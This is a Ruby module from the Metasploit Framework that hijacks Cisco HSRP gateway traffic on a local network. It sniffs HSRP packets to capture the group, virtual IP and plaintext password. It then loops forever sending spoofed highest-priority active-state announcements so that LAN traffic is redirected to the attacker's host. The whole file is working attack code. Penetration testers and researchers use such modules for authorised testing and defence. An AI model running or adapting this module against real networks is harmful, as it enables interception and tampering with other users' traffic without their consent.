##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Capture

    def initialize
        super(
            'Name'           => 'Cisco HSRP traffic hijacking.',
            'Description'    => %q{
                This module will direct LAN traffic to the attacker host if HSRP is present.
            },
            'Author'         => [ 'pello' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision$'
        )
        register_options(
            [
                Opt::RPORT(1985),
                OptString.new('INTERFACE', [true, "The name of the interface", 'eth0'])
            ], self.class)

        deregister_options('PCAPFILE','SNAPLEN','FILTER')

        begin
            require 'pcaprub'
            @@havepcap = true
        rescue ::LoadError
            @@havepcap = false
        end
    end

    def hsrp_listen
        pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, 3)
        pcap.setfilter("host 224.0.0.2 and udp port 1985")
        begin
            print_status("Sniffing traffic.....")
            Timeout.timeout(3) do
                pcap.each do |pkt|
                    eth = Racket::L2::Ethernet.new(pkt)
                    ip = Racket::L3::IPv4.new(eth.payload)
                    udp = Racket::L4::UDP.new(ip.payload)
                    hsrp = Racket::L5::HSRP.new(udp.payload)
                    @hsrp_group = hsrp.group
                    @hsrp_vip = hsrp.vip
                    @hsrp_password = hsrp.password
                    return true
                end
            end
        rescue Timeout::Error
            return false
        end

    end

    def run

        raise "Pcaprub is not available" if not @@havepcap

        @run = false
        @hsrp_group = 1
        @hsrp_priority = 254
        @hsrp_vip = ""
        @hsrp_password = "cisco"

        if hsrp_listen
            print_status("Vip: " << @hsrp_vip << "  Group: " << @hsrp_group.to_s << "  Password: " << @hsrp_password)
            print_good("Start traffic hijacking.....")

        else
            print_error("No HSRP traffic.")
            return false
        end

        @run = true

        n = Racket::Racket.new
        n.l2 = Racket::L2::Ethernet.new
        n.l2.ethertype = 0x0800
        n.l2.dst_mac = "01:00:5e:00:00:02"
        n.l3 = Racket::L3::IPv4.new
        n.l3.src_ip = datastore['RHOST']
        n.l3.dst_ip = "224.0.0.2"
        n.l3.protocol = 0x11
        n.l4 = Racket::L4::UDP.new
        n.l4.src_port = 1985
        n.l4.dst_port = 1985
        n.l5 = Racket::L5::HSRP.new
        n.l5.group = @hsrp_group
        n.l5.priority = @hsrp_priority
        n.l5.password = @hsrp_password
        n.l5.opcode = 0
        n.l5.state = 16
        n.l5.vip = @hsrp_vip

        n.l4.payload = n.l5
        n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
        n.l4.payload = ""

        n.iface = datastore['INTERFACE']
        n.pack()
        while @run
            n.send2()
            select(nil, nil, nil, 3)
        end

    end

end
